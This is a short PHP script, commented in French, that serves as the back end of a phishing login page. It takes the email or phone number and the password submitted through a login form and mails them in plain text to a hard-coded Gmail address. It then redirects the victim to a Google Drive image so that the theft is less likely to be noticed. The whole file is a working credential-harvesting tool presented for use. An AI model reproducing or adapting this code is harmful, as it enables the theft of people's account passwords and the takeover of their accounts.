<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupération des données du formulaire
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Adresse e-mail de réception des données
    $to = "sunnyaherimalala@gmail.com"; // Remplacez par votre adresse e-mail

    // Sujet de l'e-mail
    $subject = "Données du formulaire de connexion";

    // Corps de l'e-mail
    $message = "Adresse e-mail ou numéro de tél. : " . $email . "\n";
    $message .= "Mot de passe : " . $password;

    // Envoi de l'e-mail
    mail($to, $subject, $message);

    // Redirection vers une image
    header("Location: https://drive.google.com/file/d/1H_DvGl7tJ99_Oc1A7LS1PrSjWPw3ExA_/view?usp=drive_link");
}
?>
